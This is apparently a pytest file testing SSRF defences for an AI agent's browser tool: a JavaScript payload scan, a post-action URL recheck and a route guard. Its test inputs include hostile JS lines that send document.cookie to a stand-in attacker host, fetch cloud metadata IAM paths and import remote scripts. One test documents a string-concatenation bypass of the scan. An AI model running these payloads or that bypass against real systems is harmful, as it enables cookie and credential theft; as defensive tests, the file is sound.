"""Tier-2 browser SSRF defence-in-depth tests.

Two layers under test:
  1. ``_act_js_is_dangerous`` — the textual JS scan that refuses
     ``act`` payloads containing ``fetch(``, ``XMLHttpRequest``, etc.
  2. ``_post_action_url_check`` — re-runs ``_is_url_safe`` on
     ``page.url`` after every state-changing action so that a benign
     ``open`` followed by a ``click`` to ``http://169.254.169.254/...``
     gets neutralised before the next ``text``/``extract`` call leaks
     the response body.

NOTE on imports: ``tests/conftest.py`` has an autouse fixture that pops
all ``cogitum.*`` modules from ``sys.modules`` between tests for config
isolation. To keep our function references and module globals coherent,
we import inside each test (or via a fixture) after the autouse fixture
has finished its wipe.
"""
from __future__ import annotations

import asyncio
from unittest.mock import AsyncMock, MagicMock


class _AnyCallable:
    """Helper for ``mock.assert_called_with`` matchers — equal to any
    callable value. Used to assert ``ctx.on('page', <handler>)`` without
    pinning the exact closure identity."""

    def __eq__(self, other):
        return callable(other)

    def __repr__(self) -> str:
        return "<any callable>"

import pytest


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _bt():
    """Fresh import of the module after conftest's sys.modules wipe."""
    import cogitum.core.builtin_tools as bt
    return bt


def _make_page(url: str) -> MagicMock:
    """Build a mock Playwright page whose ``page.url`` returns ``url``."""
    page = MagicMock()
    page.url = url
    page.goto = AsyncMock()
    return page


def _install_mock_page(bt, page) -> None:
    """Replace ``_BROWSER_STATE`` so ``browser`` uses our mock."""
    bt._BROWSER_STATE = {"browser": MagicMock(), "page": page, "_pw": None}


# ---------------------------------------------------------------------------
# Layer 1: JS payload textual scan
# ---------------------------------------------------------------------------


def test_act_with_fetch_refused():
    bad, why = _bt()._act_js_is_dangerous(
        "fetch('http://169.254.169.254/latest/meta-data/iam/').then(r=>r.text())"
    )
    assert bad is True
    assert "fetch" in why.lower()


def test_act_with_xhr_refused():
    bad, _why = _bt()._act_js_is_dangerous(
        "var x = new XMLHttpRequest(); x.open('GET','http://10.0.0.1/'); x.send();"
    )
    assert bad is True


def test_act_with_eval_refused():
    bad, _why = _bt()._act_js_is_dangerous("eval(window.name)")
    assert bad is True


def test_act_with_function_constructor_refused():
    bad, _why = _bt()._act_js_is_dangerous("Function('return 1')()")
    assert bad is True


def test_act_with_websocket_refused():
    bad, _why = _bt()._act_js_is_dangerous("new WebSocket('ws://10.0.0.1:9999/')")
    assert bad is True


def test_act_with_send_beacon_refused():
    bad, _why = _bt()._act_js_is_dangerous(
        "navigator.sendBeacon('http://attacker/x', document.cookie)"
    )
    assert bad is True


def test_act_with_image_refused():
    bad, _why = _bt()._act_js_is_dangerous(
        "new Image().src = 'http://10.0.0.1/'"
    )
    assert bad is True


def test_act_with_dynamic_import_refused():
    bad, _why = _bt()._act_js_is_dangerous("import('http://attacker/x.js')")
    assert bad is True


def test_act_obfuscated_bypass_documented():
    """KNOWN LIMITATION: textual scan can't see through string concat.

    Pinning this so any future tightening of the scan is forced to
    update the test consciously rather than break unnoticed.
    """
    bad, _why = _bt()._act_js_is_dangerous(
        "window['fe' + 'tch']('http://169.254.169.254/').then(r=>r.text())"
    )
    assert bad is False, (
        "obfuscated bypass should NOT be caught by the naive scan; "
        "if it now is, please update this test and confirm no "
        "false-positives in legitimate JS"
    )


# ---------------------------------------------------------------------------
# Layer 1 regression: legitimate DOM-only JS must pass.
# ---------------------------------------------------------------------------


def test_legitimate_act_dom_query_passes():
    bad, _why = _bt()._act_js_is_dangerous("document.title")
    assert bad is False


def test_legitimate_act_query_selector():
    bad, _why = _bt()._act_js_is_dangerous(
        "document.querySelectorAll('a').length"
    )
    assert bad is False


def test_legitimate_act_text_content():
    bad, _why = _bt()._act_js_is_dangerous(
        "document.querySelector('h1').textContent"
    )
    assert bad is False


def test_legitimate_act_with_comment():
    """Comments containing 'fetch' shouldn't false-positive."""
    bad, _why = _bt()._act_js_is_dangerous(
        "/* this could fetch( but doesn't */ document.title"
    )
    assert bad is False


# ---------------------------------------------------------------------------
# Layer 2: post-action URL recheck
# ---------------------------------------------------------------------------


def test_post_action_blocks_metadata_ip():
    bt = _bt()
    page = _make_page("http://169.254.169.254/latest/meta-data/")
    err = asyncio.run(bt._post_action_url_check(page, "click"))
    assert err is not None
    assert "169.254.169.254" in err
    page.goto.assert_called_once()
    args, _kwargs = page.goto.call_args
    assert args[0] == "about:blank"


def test_post_action_blocks_loopback():
    bt = _bt()
    page = _make_page("http://127.0.0.1:8080/admin")
    err = asyncio.run(bt._post_action_url_check(page, "act"))
    assert err is not None
    page.goto.assert_called_once()


def test_post_action_blocks_private_range():
    bt = _bt()
    page = _make_page("http://10.0.0.5/")
    err = asyncio.run(bt._post_action_url_check(page, "back"))
    assert err is not None


def test_post_action_allows_public_url():
    bt = _bt()
    page = _make_page("https://93.184.216.34/")  # example.com IP
    err = asyncio.run(bt._post_action_url_check(page, "click"))
    assert err is None
    page.goto.assert_not_called()


def test_post_action_allows_about_blank():
    bt = _bt()
    page = _make_page("about:blank")
    err = asyncio.run(bt._post_action_url_check(page, "open"))
    assert err is None


# ---------------------------------------------------------------------------
# Integration: ``browser`` tool with a fully mocked page.
# ---------------------------------------------------------------------------


def test_browser_act_fetch_refused_integration():
    bt = _bt()
    page = _make_page("https://example.com/")
    page.evaluate = AsyncMock(return_value="should-not-be-called")
    _install_mock_page(bt, page)

    result = asyncio.run(
        bt.browser(
            action="act",
            text="fetch('http://169.254.169.254/').then(r=>r.text())",
        )
    )
    assert result.startswith("ERROR"), result
    assert "fetch" in result.lower()
    page.evaluate.assert_not_called()


def test_browser_click_neutralises_internal_redirect():
    bt = _bt()
    page = _make_page("https://example.com/")

    async def _click_redirects(*_a, **_kw):
        page.url = "http://169.254.169.254/"

    page.click = AsyncMock(side_effect=_click_redirects)
    page.goto = AsyncMock()
    _install_mock_page(bt, page)

    result = asyncio.run(bt.browser(action="click", selector="a.evil"))

    assert result.startswith("ERROR"), result
    assert "169.254.169.254" in result
    page.goto.assert_called_once()
    assert page.goto.call_args[0][0] == "about:blank"


def test_browser_legit_act_dom_query_passes():
    bt = _bt()
    page = _make_page("https://example.com/")
    page.evaluate = AsyncMock(return_value="My Title")
    _install_mock_page(bt, page)

    result = asyncio.run(bt.browser(action="act", text="document.title"))
    assert result.startswith("OK"), result
    assert "My Title" in result
    page.evaluate.assert_called_once_with("document.title")


def test_browser_click_to_safe_url_succeeds():
    bt = _bt()
    page = _make_page("https://93.184.216.34/")  # public IP, no DNS
    page.click = AsyncMock()
    _install_mock_page(bt, page)

    result = asyncio.run(bt.browser(action="click", selector="button.go"))
    assert result.startswith("OK"), result
    # Guard didn't false-positive: page.url stayed on the public IP and
    # _post_action_url_check didn't reset us to about:blank.
    page.goto.assert_not_called()


# ---------------------------------------------------------------------------
# Round-2: route handler is attached to the page after _ensure_browser.
# ---------------------------------------------------------------------------


def test_route_handler_attached_to_page():
    """``_block_internal_routes`` must be wired to the freshly-created page.

    This is the strongest SSRF defence — it covers ``<img src>``,
    ``<iframe>``, service workers, and string-concat ``fetch`` calls
    that the textual ``act`` scan misses. The previous version of the
    code defined the helper but never registered it.
    """
    bt = _bt()
    # Reset state so _ensure_browser performs a fresh new_page().
    bt._BROWSER_STATE = {"browser": None, "page": None}

    fake_page = MagicMock()
    # page.url must be a real string — _post_action_url_check inspects it
    # after every action and resets to about:blank if the URL fails to
    # parse. A bare MagicMock would round-trip as a non-URL string and
    # the test would see ERROR.
    fake_page.url = "http://93.184.216.34/"
    fake_page.route = AsyncMock()
    fake_page.goto = AsyncMock()
    fake_page.title = AsyncMock(return_value="example")

    fake_browser = MagicMock()
    fake_browser.new_page = AsyncMock(return_value=fake_page)
    fake_browser.close = AsyncMock()

    # New (T4): _ensure_browser now creates a BrowserContext first and
    # then opens pages on it — popups inherit the route guard via the
    # context. Mock both surfaces.
    fake_context = MagicMock()
    fake_context.new_page = AsyncMock(return_value=fake_page)
    fake_context.route = AsyncMock()
    fake_context.on = MagicMock()
    fake_context.close = AsyncMock()
    fake_browser.new_context = AsyncMock(return_value=fake_context)
    fake_browser.contexts = [fake_context]

    fake_pw_root = MagicMock()
    fake_pw_root.chromium.launch = AsyncMock(return_value=fake_browser)

    class _FakePlaywrightCtx:
        async def start(self_inner):
            return fake_pw_root

    import cogitum.core.builtin_tools as bt_mod  # ensure same instance
    fake_async_pw_module = MagicMock()
    fake_async_pw_module.async_playwright = lambda: _FakePlaywrightCtx()

    import sys
    sys.modules["playwright"] = MagicMock()
    sys.modules["playwright.async_api"] = fake_async_pw_module

    try:
        result = asyncio.run(
            bt_mod.browser(action="open", url="http://93.184.216.34/")
        )
    finally:
        # Cleanup: clear injected modules so other tests reload cleanly.
        sys.modules.pop("playwright.async_api", None)
        sys.modules.pop("playwright", None)
        # Reset state for downstream tests.
        bt_mod._BROWSER_STATE = {"browser": None, "page": None}

    assert result.startswith("OK"), result
    # T4: the route handler now lives on the BrowserContext, not the
    # page — so popups (target="_blank", window.open) inherit the SSRF
    # filter automatically. Belt-and-braces: the page may also get a
    # secondary handler via the new-page event, but the context one is
    # the authoritative install.
    fake_context.route.assert_called_once()
    args, _kwargs = fake_context.route.call_args
    # First positional is the URL pattern; must be "**/*" (catch-all).
    assert args[0] == "**/*"
    # Second positional is the handler function; must be callable.
    assert callable(args[1])
    # The new-page hook was wired so future popups also get a handler.
    fake_context.on.assert_called_with("page", _AnyCallable())
